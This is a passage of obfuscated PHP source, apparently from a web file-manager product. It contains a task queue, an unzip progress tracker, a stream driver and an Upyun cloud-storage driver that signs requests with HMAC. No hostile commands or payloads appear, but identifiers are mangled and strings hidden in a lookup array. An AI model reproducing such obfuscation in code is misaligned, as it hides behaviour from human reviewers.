self::setAll($ÉŠ­œ—ò); return !0; } public static function run() { $ç„Õ¢ò˜ =& $_SERVER[Æ š¦İÈ]; $Éíı…¢ = self::getAll(); $™Î¥ôÊ÷ = array_shift($Éíı…¢); if (!$™Î¥ôÊ÷) { return !1; } self::setAll($Éíı…¢); $ÀÈáşÍ = timeFloat(); try { Hook::apply($™Î¥ôÊ÷[$ç„Õ¢ò˜[261]], $™Î¥ôÊ÷[$ç„Õ¢ò˜[1721]]); } catch (Exception $Û•³²) { } $×ÏÅ†ßÜ = number_format(timeFloat() - $ÀÈáşÍ, 3) . $ç„Õ¢ò˜[1660]; write_log($ç„Õ¢ò˜[1724] . $™Î¥ôÊ÷[$ç„Õ¢ò˜[453]] . $ç„Õ¢ò˜[1725] . $×ÏÅ†ßÜ, $ç„Õ¢ò˜[1723]); return !0; } public static function count() { $·‚Îë‡ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$·‚Îë‡) { return 0; } return intval($·‚Îë‡); } public static function getAll() { $Ö°úİöú = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Ö°úİöú) { return array(); } return $Ö°úİöú; } public static function setAll($Õ»ááûä) { $ÅÇ¤ÙÑé = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Õ»ááûä), $ÅÇ¤ÙÑé); Cache::set(self::QUEUE_DATA, $Õ»ááûä, $ÅÇ¤ÙÑé); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‰òİ ¨¾, $‚ÍºÀ³• = 5.0) { if (!$‰òİ ¨¾) { return; } $¥•¬Ì = Cache::get($‰òİ ¨¾); if (!$¥•¬Ì || timeFloat() - floatVal($¥•¬Ì) >= $‚ÍºÀ³•) { Cache::set($‰òİ ¨¾, timeFloat(), $‚ÍºÀ³• * 10); return !0; } return !1; } public static function timeLimitCall($©¢¶äĞ–, $¤Ñ×œª, $²¥ĞÈƒå, $Ò•¯é×Ñ = 5.0) { $Âú´¸– =& $_SERVER[Æ š¦İÈ]; if (!$©¢¶äĞ– || !$¤Ñ×œª) { return; } self::$asyncAdd = !0; $Á¼¸êë = $Âú´¸–[1726]; $î°®À– = Cache::get($Á¼¸êë, !0); $á°æïÛ³ = array($Âú´¸–[1727] => timeFloat(), $Âú´¸–[1728] => timeFloat(), $Âú´¸–[261] => $¤Ñ×œª, $Âú´¸–[1721] => $²¥ĞÈƒå, $Âú´¸–[198] => $Ò•¯é×Ñ); if (is_array($î°®À–[$©¢¶äĞ–])) { $á°æïÛ³[$Âú´¸–[1728]] = $î°®À–[$©¢¶äĞ–][$Âú´¸–[1728]]; } if (is_array($î°®À–[$©¢¶äĞ–])) { if (timeFloat() - $î°®À–[$©¢¶äĞ–][$Âú´¸–[1727]] < $á°æïÛ³[$Âú´¸–[198]] * 0.3) { return; } $á°æïÛ³[$Âú´¸–[1728]] = $î°®À–[$©¢¶äĞ–][$Âú´¸–[1728]]; } $î°®À–[$©¢¶äĞ–] = $á°æïÛ³; Cache::set($Á¼¸êë, $î°®À–, 60); Cache::removeMemory($Á¼¸êë); write_log($Âú´¸–[1729] . $©¢¶äĞ– . $Âú´¸–[71] . $¤Ñ×œª, $Âú´¸–[1723]); } public static function timeLimitCallLoop() { $†ÂĞÃ ¨ =& $_SERVER[Æ š¦İÈ]; $ä¸ë âÂ = array($†ÂĞÃ ¨[1730]); $é•™â‰ = in_array(strtolower(ACTION), $ä¸ë âÂ); if (!$é•™â‰ && !self::$asyncAdd) { return; } $»ªçœ×æ = $†ÂĞÃ ¨[1726]; $òÒÈˆ·§ = Cache::get($»ªçœ×æ, !0); if (!$òÒÈˆ·§ || count($òÒÈˆ·§) <= 0) { return; } $’õÆïüÅ = !1; $ş«¬¶Å… = timeFloat(); $ùĞ¦¢Œ¨ = array(); foreach ($òÒÈˆ·§ as $´Ö‹·úÔ => $ÖØÅ) { if ($ş«¬¶Å… - $ÖØÅ[$†ÂĞÃ ¨[1728]] > $ÖØÅ[$†ÂĞÃ ¨[198]]) { $’õÆïüÅ = !0; try { Hook::apply($ÖØÅ[$†ÂĞÃ ¨[261]], $ÖØÅ[$†ÂĞÃ ¨[1721]]); write_log($†ÂĞÃ ¨[1731] . $´Ö‹·úÔ . $†ÂĞÃ ¨[71] . $ÖØÅ[$†ÂĞÃ ¨[261]] . $†ÂĞÃ ¨[1732] . ACTION, $†ÂĞÃ ¨[1723]); } catch (Exception $àù¸‘š®) { } continue; } $ùĞ¦¢Œ¨[$´Ö‹·úÔ] = $ÖØÅ; } if (!$’õÆïüÅ) { return; } if (!$ùĞ¦¢Œ¨) { return Cache::remove($»ªçœ×æ); } Cache::set($»ªçœ×æ, $ùĞ¦¢Œ¨, 60); Cache::removeMemory($»ªçœ×æ); } public static function finished($©Â´ğÈµ, $ã¤“î­‚) { $ƒÉ—Õİ =& $_SERVER[Æ š¦İÈ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ƒÉ—Õİ[261] => $©Â´ğÈµ, $ƒÉ—Õİ[1721] => $ã¤“î­‚); } private static function finishedRun() { $˜Š¾Ù¯÷ =& $_SERVER[Æ š¦İÈ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ø…ïóëÈ) { try { Hook::apply($Ø…ïóëÈ[$˜Š¾Ù¯÷[261]], $Ø…ïóëÈ[$˜Š¾Ù¯÷[1721]]); } catch (Exception $¯œíÑğî) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¢‰ŒÑ¢ =& $_SERVER[Æ š¦İÈ]; parent::startAfter(); Hook::bind($¢‰ŒÑ¢[1733], array($this, $¢‰ŒÑ¢[1734])); Hook::bind($¢‰ŒÑ¢[1183], array($this, $¢‰ŒÑ¢[1735])); $ÑİÕâ“ş =& $this->task; $ÑİÕâ“ş[$¢‰ŒÑ¢[1736]] = $¢‰ŒÑ¢[1188]; if (!$ÑİÕâ“ş[$¢‰ŒÑ¢[1544]]) { $ÑİÕâ“ş[$¢‰ŒÑ¢[1544]] = LNG($¢‰ŒÑ¢[1737]); } } protected function endAfter() { $£û‰Ë™Ú =& $_SERVER[Æ š¦İÈ]; parent::endAfter(); Hook::unbind($£û‰Ë™Ú[1733], array($this, $£û‰Ë™Ú[1734])); Hook::unbind($£û‰Ë™Ú[1183], array($this, $£û‰Ë™Ú[1735])); } public function updateAfter() { $Ü…íŸ½ =& $_SERVER[Æ š¦İÈ]; $ı³¢… =& $this->task; if (!$ı³¢…[$Ü…íŸ½[783]] || !$ı³¢…[$Ü…íŸ½[760]]) { return; } if ($ı³¢…[$Ü…íŸ½[1736]] == $Ü…íŸ½[1188]) { $¦Óºæ·º = 0; if ($ı³¢…[$Ü…íŸ½[1692]]) { $¦Óºæ·º = $ı³¢…[$Ü…íŸ½[1693]] / $ı³¢…[$Ü…íŸ½[1692]]; } $ı³¢…[$Ü…íŸ½[1646]] = $¦Óºæ·º * 0.3; } else { if ($ı³¢…[$Ü…íŸ½[1736]] == $Ü…íŸ½[310]) { $¦Óºæ·º = $ı³¢…[$Ü…íŸ½[1645]] / $ı³¢…[$Ü…íŸ½[783]]; $ı³¢…[$Ü…íŸ½[1646]] = 0.3 + $¦Óºæ·º * 0.4; } else { if ($ı³¢…[$Ü…íŸ½[1736]] == $Ü…íŸ½[108]) { $­‹³íœ = 0; if ($ı³¢…[$Ü…íŸ½[1694]] == $Ü…íŸ½[108]) { $­‹³íœ = $ı³¢…[$Ü…íŸ½[1693]]; } $¦Óºæ·º = ($ı³¢…[$Ü…íŸ½[1697]] + $­‹³íœ) / $ı³¢…[$Ü…íŸ½[760]]; $ı³¢…[$Ü…íŸ½[1646]] = 0.3 + 0.4 + $¦Óºæ·º * 0.3; } } } if ($ı³¢…[$Ü…íŸ½[1646]] > 0) { $‡í¥ÕËÁ = timeFloat() - $ı³¢…[$Ü…íŸ½[1648]] - $ı³¢…[$Ü…íŸ½[1651]]; $ı³¢…[$Ü…íŸ½[1652]] = $‡í¥ÕËÁ * (1 - $ı³¢…[$Ü…íŸ½[1646]]) / $ı³¢…[$Ü…íŸ½[1646]]; } } public function addFile($‰éˆ”ôÉ) { $¤¡Ç³À =& $_SERVER[Æ š¦İÈ]; $’Ê·‡Ï¼ =& $this->task; $½Š³Îˆ› = IO::info($‰éˆ”ôÉ); $’Ê·‡Ï¼[$¤¡Ç³À[1690]] = $½Š³Îˆ›[$¤¡Ç³À[32]]; $’Ê·‡Ï¼[$¤¡Ç³À[1692]] = $½Š³Îˆ›[$¤¡Ç³À[80]]; $’Ê·‡Ï¼[$¤¡Ç³À[1693]] = 0; $’Ê·‡Ï¼[$¤¡Ç³À[1055]] = $¤¡Ç³À[1712]; $’Ê·‡Ï¼[$¤¡Ç³À[1694]] = $¤¡Ç³À[1188]; $’Ê·‡Ï¼[$¤¡Ç³À[760]] = $½Š³Îˆ›[$¤¡Ç³À[80]]; $’Ê·‡Ï¼[$¤¡Ç³À[783]] = 1; $¯‘°ù¿¯ = 0; $’Ê·‡Ï¼[$¤¡Ç³À[1701]] = array($¤¡Ç³À[1702] => $¯‘°ù¿¯ + 1, $¤¡Ç³À[423] => $½Š³Îˆ›[$¤¡Ç³À[32]], $¤¡Ç³À[78] => $½Š³Îˆ›[$¤¡Ç³À[78]], $¤¡Ç³À[521] => $½Š³Îˆ›[$¤¡Ç³À[521]] ? $½Š³Îˆ›[$¤¡Ç³À[521]] : $½Š³Îˆ›[$¤¡Ç³À[78]]); $this->update(); } public function unzipAfter($Œøà•¿Õ) { $†–İÃˆ° =& $_SERVER[Æ š¦İÈ]; $Ì‚ıìÓ½ =& $this->task; $Ì‚ıìÓ½[$†–İÃˆ°[1736]] = $†–İÃˆ°[108]; $üŞ¹×˜ = IO::infoWithChildren($Œøà•¿Õ); $„İ¤¢ú§ = 0; $Ì‚ıìÓ½[$†–İÃˆ°[1701]] = array($†–İÃˆ°[1702] => $„İ¤¢ú§ + 1, $†–İÃˆ°[423] => $üŞ¹×˜[$†–İÃˆ°[32]], $†–İÃˆ°[78] => $üŞ¹×˜[$†–İÃˆ°[78]], $†–İÃˆ°[521] => $üŞ¹×˜[$†–İÃˆ°[521]] ? $üŞ¹×˜[$†–İÃˆ°[521]] : $üŞ¹×˜[$†–İÃˆ°[78]]); if ($üŞ¹×˜[$†–İÃˆ°[33]] == $†–İÃˆ°[194]) { $Ì‚ıìÓ½[$†–İÃˆ°[783]] = 1; } else { $Ì‚ıìÓ½[$†–İÃˆ°[783]] = $üŞ¹×˜[$†–İÃˆ°[83]][$†–İÃˆ°[81]]; } $Ì‚ıìÓ½[$†–İÃˆ°[1055]] = $†–İÃˆ°[12]; $Ì‚ıìÓ½[$†–İÃˆ°[1694]] = 0; $Ì‚ıìÓ½[$†–İÃˆ°[1645]] = 0; $Ì‚ıìÓ½[$†–İÃˆ°[1692]] = 0; $Ì‚ıìÓ½[$†–İÃˆ°[1693]] = 0; $Ì‚ıìÓ½[$†–İÃˆ°[1690]] = $†–İÃˆ°[12]; $Ì‚ıìÓ½[$†–İÃˆ°[1697]] = 0; $Ì‚ıìÓ½[$†–İÃˆ°[760]] = $üŞ¹×˜[$†–İÃˆ°[80]]; $this->update(); self::log($†–İÃˆ°[1738] . json_encode(array($Ì‚ıìÓ½, $üŞ¹×˜))); } public function nameParse($´½”î) { $›µéå“Ğ =& $_SERVER[Æ š¦İÈ]; $›ş™éŒø =& $this->task; if ($›ş™éŒø[$›µéå“Ğ[1736]] == $›µéå“Ğ[1188]) { $›ş™éŒø[$›µéå“Ğ[1736]] = $›µéå“Ğ[310]; $›ş™éŒø[$›µéå“Ğ[1697]] = 0; $›ş™éŒø[$›µéå“Ğ[760]] = 0; } $‹§Ù‘Ç = get_path_this($´½”î); if (strstr($‹§Ù‘Ç, $›µéå“Ğ[10])) { $›ş™éŒø[$›µéå“Ğ[1645]] += 1; $›ş™éŒø[$›µéå“Ğ[783]] += 1; } $›ş™éŒø[$›µéå“Ğ[1690]] = $´½”î; $this->update(); } } goto CŒˆŠ†ÀÑ¤; f«ÓÏå¼òù: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($“õúŞÛ¥, $ÍÁß™–‘ = 0) { parent::__construct(); $this->source = $“õúŞÛ¥; $this->sourceSize = $ÍÁß™–‘; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¿Ş­ãÆ = false) { return $this->sourceSize; } public function getContent($ïÚÃíØ = false) { return $this->fileSubstr($ïÚÃíØ, 0, $this->sourceSize); } public function fileSubstr($±²éé¾­ = false, $ªàÌœ× = 0, $‚Šôõå = 0) { if (!$‚Šôõå) { $‚Šôõå = $this->sourceSize; } $›ìõÔä³ = $this->sourceSize - $ªàÌœ×; if ($‚Šôõå >= $›ìõÔä³) { $‚Šôõå = $›ìõÔä³; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ªàÌœ×, $‚Šôõå); } if ($this->sourceType == self::TYPE_FILE) { if ($‚Šôõå <= 0) { return $_SERVER[Æ š¦İÈ][12]; } $Õ¬ëˆß– = ftell($this->source); fseek_64($this->source, $Õ¬ëˆß– + $ªàÌœ×); $Ò€À¡ã = @fread($this->source, $‚Šôõå); fseek_64($this->source, $Õ¬ëˆß–); return $Ò€À¡ã; } } public function hashMd5($²±…ÃÑã = false) { return md5($this->getContent()); } public static function hash($şÏÑµ¾¦, $ÃÃÉŠê = 0) { $È¨†›¹Ä = new PathDriverStream($şÏÑµ¾¦, $ÃÃÉŠê); return $È¨†›¹Ä->hashSimple($şÏÑµ¾¦); } public static function md5($áø„ÅÚŒ, $Úöûóé¶ = 0) { $úÇæ©ÇÑ = new PathDriverStream($áø„ÅÚŒ, $Úöûóé¶); return $úÇæ©ÇÑ->hashMd5($áø„ÅÚŒ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\x2f\57\x76\x30\56\x61\x70\151\x2e\x75\x70\x79\165\156\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($â¸ÚĞ‘ü) { parent::__construct(); $this->_init($â¸ÚĞ‘ü); } public function _init($ÙÃÇåœ¥) { $·Òñ­Ùú =& $_SERVER[Æ š¦İÈ]; foreach ($ÙÃÇåœ¥ as $›’Ö¥şì => $¦¡–³Ø) { if (isset($this->{$›’Ö¥şì})) { $this->{$›’Ö¥şì} = $¦¡–³Ø; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($·Òñ­Ùú[1442] . LNG($·Òñ­Ùú[1373])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ìâ‡ÒÃ¢, $×Ù¡ôÌ = "\x47\x45\124") { $ş›Ë™çã =& $_SERVER[Æ š¦İÈ]; $“ÒÎòÈ­ = gmdate($ş›Ë™çã[1406]); $´Êœ’§Í = base64_encode(hash_hmac($ş›Ë™çã[1443], "{$×Ù¡ôÌ}\x26{$Ìâ‡ÒÃ¢}\46{$“ÒÎòÈ­}", md5("{$this->userpass}"), !0)); $”ÑæÚôµ = array("\101\x75\164\x68\x6f\x72\151\x7a\141\164\x69\157\x6e\72\x55\x50\131\x55\116\x20{$this->username}\x3a{$´Êœ’§Í}", "\x44\141\164\145\72{$“ÒÎòÈ­}"); return $”ÑæÚôµ; } public function ussRequest($Çô“Ÿ¬é, $Å—À—Å = "\107\105\124", $æÄä¹§Ú = false, $€ƒ† ıÕ = false, $ Ñíˆ¾• = false) { $•ˆøÌ± =& $_SERVER[Æ š¦İÈ]; $Çô“Ÿ¬é = trim($Çô“Ÿ¬é, $•ˆøÌ±[8]); $ÛïàğÚû = "\57{$this->bucket}\x2f{$Çô“Ÿ¬é}"; $û²ø¢¬¥ = $this->ussHeaders($ÛïàğÚû, $Å—À—Å); if ($€ƒ† ıÕ) { $û²ø¢¬¥ = array_merge($û²ø¢¬¥, $€ƒ† ıÕ); } $£½¬³Ó¨ = url_request($this->endpoint . $ÛïàğÚû, $Å—À—Å, $æÄä¹§Ú, $û²ø¢¬¥, $ Ñíˆ¾•); if (!$£½¬³Ó¨) { return array($•ˆøÌ±[1180] => !1, $•ˆøÌ±[1182] => $•ˆøÌ±[1444]); } if (strtolower($Å—À—Å) == $•ˆøÌ±[191] || in_array($£½¬³Ó¨[$•ˆøÌ±[1180]], array($•ˆøÌ±[1299], $•ˆøÌ±[1445]))) { $æÄä¹§Ú = $£½¬³Ó¨[$•ˆøÌ±[1446]]; } else { $æÄä¹§Ú = json_decode($£½¬³Ó¨[$•ˆøÌ±[1182]], !0); if (!$æÄä¹§Ú) { $æÄä¹§Ú = $£½¬³Ó¨[$•ˆøÌ±[1182]]; } else { if (!$£½¬³Ó¨[$•ˆøÌ±[747]] && isset($æÄä¹§Ú[$•ˆøÌ±[1447]])) { $æÄä¹§Ú = $æÄä¹§Ú[$•ˆøÌ±[1447]]; } } } return array($•ˆøÌ±[1180] => $£½¬³Ó¨[$•ˆøÌ±[747]], $•ˆøÌ±[1182] => $æÄä¹§Ú); } public function mkfile($¼óŞé€î, $‡ıÄ‘ù  = '', $²üòµµ… = REPEAT_RENAME) { if ($this->setContent($¼óŞé€î, $‡ıÄ‘ù )) { return $this->getPathOuter($¼óŞé€î); } return !1; } public function mkdir($Ğ†ƒÎÍ, $ÙÈˆ­Û = REPEAT_SKIP) { $ ˆ“òÂ =& $_SERVER[Æ š¦İÈ]; $§ğ€úÈ = trim($Ğ†ƒÎÍ, $ ˆ“òÂ[8]); if ($this->_isFolder($§ğ€úÈ)) { return $this->getPathOuter($§ğ€úÈ); } $ŸçÈ’Úì = array($ ˆ“òÂ[1448]); $ÓÓ¡õƒÁ = $this->ussRequest($§ğ€úÈ, $ ˆ“òÂ[223], !1, $ŸçÈ’Úì); return $ÓÓ¡õƒÁ[$ ˆ“òÂ[1180]] ? $this->getPathOuter($§ğ€úÈ) : !1; } public function copyFile($á»´Ö², $°ú¿÷é) { $ÌÂÂšÔ =& $_SERVER[Æ š¦İÈ]; $½›±¡ó = array($ÌÂÂšÔ[1449] . "\x2f{$this->bucket}\x2f{$á»´Ö²}", $ÌÂÂšÔ[1450]); $úÅ¶Çãü = $this->ussRequest($°ú¿÷é, $ÌÂÂšÔ[225], !1, $½›±¡ó); return $úÅ¶Çãü[$ÌÂÂšÔ[1180]] ? !0 : $this->getPathOuter($°ú¿÷é); } public function moveFile($Ï¬×š¢Ø, $î…€îÔº) { $µ¸Ô¼ş =& $_SERVER[Æ š¦İÈ]; $Ñ‹ êª = array($µ¸Ô¼ş[1451] . "\x2f{$this->bucket}\x2f{$Ï¬×š¢Ø}", $µ¸Ô¼ş[1450]); $ÀâŠ¸µ½ = $this->ussRequest($î…€îÔº, $µ¸Ô¼ş[225], !1, $Ñ‹ êª); return $ÀâŠ¸µ½[$µ¸Ô¼ş[1180]] ? !0 : $this->getPathOuter($î…€îÔº); } public function delFile($àş•’‰´) { $Öº™İù‹ =& $_SERVER[Æ š¦İÈ]; $´®´ˆƒŞ = $this->ussRequest($àş•’‰´, $Öº™İù‹[1452]); return $´®´ˆƒŞ[$Öº™İù‹[1180]] ? !0 : !1; } public function delFolder($Ş°ËÀà¼) { $¡šÌ¹¬õ =& $_SERVER[Æ š¦İÈ]; if (!$this->exist($Ş°ËÀà¼)) { return !0; } $this->listItemCache = !1; $ŸœË¶‹¢ = $ĞŞÒİØŞ = array(); $this->fileList($Ş°ËÀà¼, $ŸœË¶‹¢, $ĞŞÒİØŞ, !0); $this->listItemCache = !0; foreach ($ĞŞÒİØŞ as $±¬©­©) { $ö§Ç¯Ÿã = $this->ussRequest($±¬©­©[$¡šÌ¹¬õ[32]], $¡šÌ¹¬õ[1452]); if (!$ö§Ç¯Ÿã[$¡šÌ¹¬õ[1180]]) { return !1; } } foreach ($ŸœË¶‹¢ as $Æ¶¤Ò¤) { $ö§Ç¯Ÿã = $this->ussRequest($Æ¶¤Ò¤, $¡šÌ¹¬õ[1452]); if (!$ö§Ç¯Ÿã[$¡šÌ¹¬õ[1180]]) { return !1; } } $ö§Ç¯Ÿã = $this->ussRequest($Ş°ËÀà¼, $¡šÌ¹¬õ[1452]); return $ö§Ç¯Ÿã[$¡šÌ¹¬õ[1180]]; } public function rename($ş£¥çÔ, $Ø¬ Çó) { if ($this->isFile($ş£¥çÔ)) { $Ø¬ Çó = get_path_father($ş£¥çÔ) . $Ø¬ Çó; return $this->moveFile($ş£¥çÔ, $Ø¬ Çó); } return $this->renameObject($ş£¥çÔ, $Ø¬ Çó); } public function fileInfo($”ŠËßµœ, $×‘İ©â = false, $Ç ¡‚£è = array()) { $æôã¤ÂÛ =& $_SERVER[Æ š¦İÈ]; $©²Ôºóß = array($æôã¤ÂÛ[32] => $this->pathThis($”ŠËßµœ), $æôã¤ÂÛ[78] => $this->getPathOuter($æôã¤ÂÛ[8] . $”ŠËßµœ), $æôã¤ÂÛ[33] => $æôã¤ÂÛ[194], $æôã¤ÂÛ[80] => isset($Ç ¡‚£è[$æôã¤ÂÛ[80]]) ? $Ç ¡‚£è[$æôã¤ÂÛ[80]] : 0, $æôã¤ÂÛ[169] => $this->ext($”ŠËßµœ)); if ($×‘İ©â) { return $©²Ôºóß; } $©²Ôºóß[$æôã¤ÂÛ[195]] = $©²Ôºóß[$æôã¤ÂÛ[86]] = 0; $©²Ôºóß[$æôã¤ÂÛ[196]] = $©²Ôºóß[$æôã¤ÂÛ[197]] = !0; if (empty($Ç ¡‚£è)) { $Ç ¡‚£è = $this->objectMeta($”ŠËßµœ); if (!$Ç ¡‚£è) { return $©²Ôºóß; } } $©²Ôºóß[$æôã¤ÂÛ[195]] = intval($Ç ¡‚£è[$æôã¤ÂÛ[1453]]); $©²Ôºóß[$æôã¤ÂÛ[86]] = intval($Ç ¡‚£è[$æôã¤ÂÛ[1454]]); $©²Ôºóß[$æôã¤ÂÛ[80]] = $Ç ¡‚£è[$æôã¤ÂÛ[80]]; return $©²Ôºóß; } public function folderInfo($®ÖçĞŠ, $÷Ú²íê² = false) { $Ï“ßŞï =& $_SERVER[Æ š¦İÈ]; $­ã°´½‚ = array($Ï“ßŞï[32] => $this->pathThis($®ÖçĞŠ), $Ï“ßŞï[78] => $this->getPathOuter($Ï“ßŞï[8] . $®ÖçĞŠ), $Ï“ßŞï[33] => $Ï“ßŞï[79]); if ($÷Ú²íê²) { return $­ã°´½‚; } $­ã°´½‚[$Ï“ßŞï[195]] = $­ã°´½‚[$Ï“ßŞï[86]] = 0; $­ã°´½‚[$Ï“ßŞï[196]] = $­ã°´½‚[$Ï“ßŞï[197]] = !0; if (empty($îäàÔÔç)) { $îäàÔÔç = $this->objectMeta($®ÖçĞŠ); if (!$îäàÔÔç) { return $­ã°´½‚; } } $­ã°´½‚[$Ï“ßŞï[195]] = intval($îäàÔÔç[$Ï“ßŞï[1453]]); $­ã°´½‚[$Ï“ßŞï[86]] = intval($îäàÔÔç[$Ï“ßŞï[1454]]); return $­ã°´½‚; } private function listObjs($ÉÙ÷˜«¶, $Û¡çËŒ¢ = 0, $–¬Î¬á® = 1000) { $³¿›Ë´ =& $_SERVER[Æ š¦İÈ]; $ÔïÒ”Ëè = array($³¿›Ë´[1455], $³¿›Ë´[1456] . $–¬Î¬á®); if ($Û¡çËŒ¢) { $ÔïÒ”Ëè[] = $³¿›Ë´[1457] . $Û¡çËŒ¢; } $æÅÀ½ãÚ = $this->ussRequest($ÉÙ÷˜«¶, $³¿›Ë´[227], !1, $ÔïÒ”Ëè); return !$æÅÀ½ãÚ[$³¿›Ë´[1180]] ? !1 : $æÅÀ½ãÚ[$³¿›Ë´[1182]]; } private function fileList($¤á±ÙÆà, &$è«İßáÀ, &$³¶Í™ş³, $ÚØÉ¤‹Ê = false) { $Ùº÷¨¸ =& $_SERVER[Æ š¦İÈ]; $ĞÏ¤Â¨¥ = $Ùº÷¨¸[12]; $²Àí€…™ = 1000; $ç‡„®ÜÙ = rtrim($¤á±ÙÆà, $Ùº÷¨¸[8]) . $Ùº÷¨¸[8]; $Îœ–’ƒú = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $ƒà˜ö©å = $this->listObjs($¤á±ÙÆà, $ĞÏ¤Â¨¥, $²Àí€…™); if (!$ƒà˜ö©å) { return !1; } $ĞÏ¤Â¨¥ = isset($ƒà˜ö©å[$Ùº÷¨¸[1458]]) ? $ƒà˜ö©å[$Ùº÷¨¸[1458]] : $Ùº÷¨¸[12]; $ó¼ñÙ ± = isset($ƒà˜ö©å[$Ùº÷¨¸[1459]]) ? $ƒà˜ö©å[$Ùº÷¨¸[1459]] : array(); foreach ($ó¼ñÙ ± as $ŞĞªêÎÎ) { $üÔ¬ºøè = $ŞĞªêÎÎ[$Ùº÷¨¸[33]] == $Ùº÷¨¸[79] ? !0 : !1; $ä‘€ü“¥ = ltrim($ç‡„®ÜÙ . $ŞĞªêÎÎ[$Ùº÷¨¸[32]], $Ùº÷¨¸[8]) . ($üÔ¬ºøè ? $Ùº÷¨¸[8] : $Ùº÷¨¸[12]); $Åîõî‘ = array($Ùº÷¨¸[32] => $ä‘€ü“¥, $Ùº÷¨¸[33] => $üÔ¬ºøè ? $Ùº÷¨¸[79] : $Ùº÷¨¸[194], $Ùº÷¨¸[80] => $ŞĞªêÎÎ[$Ùº÷¨¸[334]], $Ùº÷¨¸[1454] => $ŞĞªêÎÎ[$Ùº÷¨¸[1460]]); if ($Îœ–’ƒú) { $this->cacheMethod($Ùº÷¨¸[200], $ä‘€ü“¥, $üÔ¬ºøè); $this->cacheMethod($Ùº÷¨¸[201], $ä‘€ü“¥, $Åîõî‘); } if ($üÔ¬ºøè) { $è«İßáÀ[] = $ä‘€ü“¥; if ($ÚØÉ¤‹Ê) { $this->fileList($ä‘€ü“¥, $è«İßáÀ, $³¶Í™ş³, $ÚØÉ¤‹Ê); } continue; } $³¶Í™ş³[] = $Åîõî‘; } if (count($ó¼ñÙ ±) < $²Àí€…™) { break; } } if ($Îœ–’ƒú) { $this->cacheMethod($Ùº÷¨¸[200], $¤á±ÙÆà, !0); } } public function listPath($ãÁÅ…˜, $Œï°‡Œ­ = false) { $Ôş¿¤¡è =& $_SERVER[Æ š¦İÈ]; $îæÔóŸ– = $®¢ğ ú = array(); $this->fileList($ãÁÅ…˜, $îæÔóŸ–, $®¢ğ ú); foreach ($îæÔóŸ– as $Ôë®ëÕè => $—ËŠñÄ) { $îæÔóŸ–[$Ôë®ëÕè] = $this->folderInfo($—ËŠñÄ, $Œï°‡Œ­); } foreach ($®¢ğ ú as $Ôë®ëÕè => $—ËŠñÄ) { $®¢ğ ú[$Ôë®ëÕè] = $this->fileInfo($—ËŠñÄ[$Ôş¿¤¡è[32]], $Œï°‡Œ­, $—ËŠñÄ); } return array($Ôş¿¤¡è[77] => $îæÔóŸ–, $Ôş¿¤¡è[76] => $®¢ğ ú); } public function has($ö…·™ìÅ, $ë¶„ïÀğ = false, $¶”“ˆ€Á = true) { $¡¸ê¾½¹ =& $_SERVER[Æ š¦İÈ]; $È €Îã = $¡¸ê¾½¹[12]; $ŸåÙ·™â = 500; $²Ä†Ñâ› = 0; $ğİëŸä— = 0; $ŞŞØÎÏã = rtrim($ö…·™ìÅ, $¡¸ê¾½¹[8]) . $¡¸ê¾½¹[8]; while (!0) { check_abort(); $é…É§Ñ = $this->listObjs($ö…·™ìÅ, $È €Îã, $ŸåÙ·™â); if (!$é…É§Ñ) { return !1; } $È €Îã = isset($é…É§Ñ[$¡¸ê¾½¹[1458]]) ? $é…É§Ñ[$¡¸ê¾½¹[1458]] : $¡¸ê¾½¹[12]; $³ëÔµµå = isset($é…É§Ñ[$¡¸ê¾½¹[1459]]) ? $é…É§Ñ[$¡¸ê¾½¹[1459]] : array(); if (empty($³ëÔµµå)) { break; } $Í•ú‹»™ = array_filter($³ëÔµµå, function ($Äúß±©º) { $„¡½Ê…¿ =& $_SERVER[Æ š¦İÈ]; return $Äúß±©º[$„¡½Ê…¿[33]] == $„¡½Ê…¿[79]; }); $”ıãŠÛô = count($³ëÔµµå); $Í•ú‹»™ = count($Í•ú‹»™); $ÔÊì¶ì› = $”ıãŠÛô - $Í•ú‹»™; if ($ë¶„ïÀğ) { $ğİëŸä— += $Í•ú‹»™; $²Ä†Ñâ› += $ÔÊì¶ì›; if ($”ıãŠÛô < $ŸåÙ·™â) { break; } continue; } if ($¶”“ˆ€Á) { if ($ÔÊì¶ì›) { return !0; } } else { if ($Í•ú‹»™) { return !0; } } if ($”ıãŠÛô < $ŸåÙ·™â) { break; } } if ($ë¶„ïÀğ) { return array($¡¸ê¾½¹[204] => $²Ä†Ñâ›, $¡¸ê¾½¹[205] => $ğİëŸä—); } return !1; } public function listAll($Ê¯·ïı³) { $³ÊÒé¢ =& $_SERVER[Æ š¦İÈ]; $‚óÅíÌ = $È’½Îçâ = array(); $this->fileList($Ê¯·ïı³, $‚óÅíÌ, $È’½Îçâ, !0); $á¡±ˆæ = array(); foreach ($È’½Îçâ as $ôÎ¾’Óğ) { $á¡±ˆæ[$ôÎ¾’Óğ[$³ÊÒé¢[32]]] = $ôÎ¾’Óğ[$³ÊÒé¢[80]]; } foreach ($‚óÅíÌ as $ôÎ¾’Óğ) { if (is_string($ôÎ¾’Óğ)) { $á¡±ˆæ[$ôÎ¾’Óğ] = 0; 